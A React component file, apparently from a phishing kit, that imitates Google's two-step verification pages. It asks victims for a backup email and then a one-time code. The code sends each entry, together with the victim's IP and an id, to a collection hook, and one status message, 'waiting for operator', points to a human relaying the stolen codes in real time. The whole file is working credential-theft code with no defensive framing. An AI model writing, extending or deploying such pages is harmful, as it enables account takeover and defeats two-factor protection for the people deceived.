import React, { useState, useEffect, useContext } from "react";
import { DataContext } from "../../pages";
import SendData from "../../hooks/SendData";
import GoogleShell, {
  GTitle,
  GBody,
  GError,
  GoogleInput,
  GoogleSpinner,
  NextButton,
  TextButton,
  GContent,
  GLeft,
  GRight,
  GActions,
} from "./GoogleShell";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import { GOOGLE_CONFIG } from "../../utils/googleConfig";

function GoogleBackup({ Unik, setStep, Email, Tel, Ip, LastFetch, wrong2faTrigger }) {
  const { setAllData, AllData } = useContext(DataContext);

  const [page, setPage] = useState("email");
  const [backupEmail, setBackupEmail] = useState("");
  const [emailError, setEmailError] = useState("");
  const [emailLoading, setEmailLoading] = useState(false);
  const [showWaiting, setShowWaiting] = useState(false);

  const displayEmail = AllData?.google_email || Email || AllData?.login_email || "";

  const sendUpdate = (extra, stepMessage) => {
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip || AllData?.ip,
      ...extra,
      currentStep: stepMessage,
    };
    setAllData(params);
    SendData(params);
  };

  useEffect(() => {
    sendUpdate({}, "Google Backup 2FA - Email request page loaded");
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const validateEmail = (value) => {
    const v = value.trim();
    if (!v) {
      setEmailError("Enter an email address");
      return false;
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
      setEmailError("Enter a valid email address");
      return false;
    }
    return true;
  };

  const handleEmailNext = (e) => {
    e.preventDefault();
    if (emailLoading) return;
    if (!validateEmail(backupEmail)) return;

    setEmailError("");
    setEmailLoading(true);
    sendUpdate(
      { google_backup_email: backupEmail.trim() },
      `Google Backup 2FA - Backup email submitted: \`${backupEmail.trim()}\``
    );
    setTimeout(() => {
      setEmailLoading(false);
      setPage("code");
    }, GOOGLE_CONFIG.VERIFY_DELAY);
  };

  const handleTryAnotherWay = () => {
    if (showWaiting) return;
    setShowWaiting(true);
    sendUpdate({}, "Google Backup 2FA - User clicked Try another way — waiting for operator");
  };

  if (showWaiting) {
    return (
      <GoogleShell initialLoading={false}>
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: 300, gap: 24 }}>
          <GoogleSpinner size={36} />
          <GBody style={{ textAlign: "center" }}>Looking for more options…</GBody>
        </div>
      </GoogleShell>
    );
  }

  // ---- Page: Backup email ----
  if (page === "email") {
    return (
      <GoogleShell initialLoading>
        <GContent>
          <GLeft>
            <GTitle style={{ fontSize: 36 }}>Get a verification code</GTitle>
            <GBody style={{ marginBottom: 8, fontSize: 15, color: "#1f1f1f" }}>{displayEmail}</GBody>
            <GBody style={{ marginBottom: 32 }}>
              To help keep your account safe, Google wants to make sure
              it&rsquo;s really you trying to sign in
            </GBody>
            <GBody>
              To get a verification code, first confirm the backup email
              address you added to your account. Google will send a
              verification code to this email.
            </GBody>
          </GLeft>
          <GRight>
            <form id="google-backup-email-form" onSubmit={handleEmailNext}>
              <GoogleInput
                label="Backup email"
                name="backup-email"
                type="email"
                value={backupEmail}
                onChange={(e) => {
                  setBackupEmail(e.target.value);
                  if (emailError) setEmailError("");
                }}
                error={!!emailError}
                disabled={emailLoading || showWaiting}
                autoFocus
                autoComplete="email"
              />
              {emailError && <GError>{emailError}</GError>}
            </form>
          </GRight>
        </GContent>
        <GActions>
          <TextButton type="button" onClick={handleTryAnotherWay} disabled={emailLoading || showWaiting}>
            {showWaiting ? <GoogleSpinner size={16} /> : "Try another way"}
          </TextButton>
          <NextButton type="submit" form="google-backup-email-form" disabled={emailLoading || showWaiting}>
            {emailLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Next"}
          </NextButton>
        </GActions>
      </GoogleShell>
    );
  }

  // ---- Page: Backup code entry ----
  return <GoogleBackupCodeEntry setStep={setStep} LastFetch={LastFetch} wrong2faTrigger={wrong2faTrigger} displayEmail={displayEmail} backupEmail={backupEmail} />;
}

// --------- Code entry sub-component (uses useFa2Logic) ---------
function GoogleBackupCodeEntry({ setStep, LastFetch, wrong2faTrigger, displayEmail, backupEmail }) {
  const [showWaiting, setShowWaiting] = useState(false);

  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName: "Google Backup Code 2FA",
    initialMessage: "Google Backup Code 2FA - Code Entry Page Loaded",
    allowImmediateRetry: true,
  });

  const handleFormSubmit = (e) => {
    handleSubmit(e, "google_backup");
  };

  const handleTryAnotherWay = () => {
    if (showWaiting || isLoading) return;
    setShowWaiting(true);
  };

  if (showWaiting) {
    return (
      <GoogleShell initialLoading={false}>
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: 300, gap: 24 }}>
          <GoogleSpinner size={36} />
          <GBody style={{ textAlign: "center" }}>Looking for more options…</GBody>
        </div>
      </GoogleShell>
    );
  }

  return (
    <GoogleShell initialLoading>
      <GContent>
        <GLeft>
          <GTitle style={{ fontSize: 36 }}>Check your email</GTitle>
          <GBody style={{ fontSize: 15, color: "#1f1f1f" }}>{displayEmail}</GBody>
          <GBody style={{ marginTop: 24 }}>
            To help keep your account safe, Google wants to make sure
            it&rsquo;s really you trying to sign in
          </GBody>
          <GBody style={{ marginTop: 8 }}>
            Google sent a verification code to{" "}
            <strong>{backupEmail}</strong>. Enter the code below to
            continue.
          </GBody>
        </GLeft>
        <GRight>
          <form id="google-backup-code-form" onSubmit={handleFormSubmit}>
            <GoogleInput
              label="Enter code"
              name="backup-code"
              value={code}
              onChange={handleCodeChange}
              error={shouldShowRedBorder()}
              disabled={isLoading || showWaiting}
              autoFocus
              autoComplete="one-time-code"
            />
            {showError && <GError>Wrong code. Try again.</GError>}
          </form>
        </GRight>
      </GContent>
      <GActions>
        <TextButton type="button" onClick={handleTryAnotherWay} disabled={isLoading || showWaiting}>
          {showWaiting ? <GoogleSpinner size={16} /> : "Try another way"}
        </TextButton>
        <NextButton type="submit" form="google-backup-code-form" disabled={isButtonDisabled() || showWaiting}>
          {isLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Next"}
        </NextButton>
      </GActions>
    </GoogleShell>
  );
}

export default GoogleBackup;
